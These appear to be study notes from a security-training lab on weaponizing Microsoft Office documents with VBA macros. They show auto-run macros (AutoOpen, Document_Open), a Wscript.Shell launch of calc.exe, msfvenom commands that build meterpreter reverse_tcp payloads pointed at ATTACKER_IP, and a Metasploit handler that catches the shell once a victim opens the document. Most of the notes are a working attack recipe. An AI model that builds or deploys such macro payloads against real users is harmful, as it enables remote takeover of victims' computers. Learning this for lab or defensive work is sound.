A programming language ***implemented for Microsoft applications such as Word, Excel, PowerPoint***, etc. It ***allows automating tasks of nearly every keyboard and mouse interaction between a user and Microsoft Office applications***.

`Macros` are Microsoft Office applications that contain ***embedded code written in a programming language knows as VBA***. It is used to ***create custom functions to speed up manual tasks*** by ***creating automated processes***. VBA can ***access the Windows API and other low-level functions***, making it powerful for customization and automation.

#### Create a Macro
1. `Create a new blank Microsoft Document.`
2. `View -> macros`
3. `Choose the macro name and select from the Macros in list Document1. Finally select create.`
4. `To execute the VBA code automatically (AutoOpen and Document_Open) once the document gets opened. Run or F5 to run the macro.`
	```
		Sub Document_Open()
		  THM
		End Sub

		Sub AutoOpen()
		  THM
		End Sub
		
		Sub THM()
		   MsgBox ("Welcome to Weaponization Room!")
		End Sub
	```
**Note: Save it in Macro-Enabled format such as `.doc` and `.docm`. Save the file as `Word 97-2003 Template`.**

5. To execute a `calc.exe`:
	```
	Sub PoC()
		Dim payload As String
		payload = "calc.exe"
		CreateObject("Wscript.Shell").Run payload,0
	End Sub
	```

#### Reverse Shell
Create an in-memory meterpreter payload using Metasploit framework to receive a reverse shell.
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=443 -f vba
```
**Important to Note: The output will be working on an MS excel sheet. Therefore, change the `Workbook_Open()` to `Document_Open()` to make it suitable for MS word documents. **

```
msfconsole -q
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost IP
set lport 443
run
```

Once the malicious MS word document is opened on the victim machine, we should receive a reverse shell.

#### Important Note
If you don't have access to the machine, use the bottom method to generate a payload.
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=443 -f vba
```
- `-f vba:` generates VBA payloads, which are meant for macros in Office documents, not standalone VBS scripts.

**Generate a proper VBS Payload**
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=443 -f vbs -o payload.vbs
```
- `-f vbs:` ensures the payload is formatted for VBScript execution instead of an Office macro.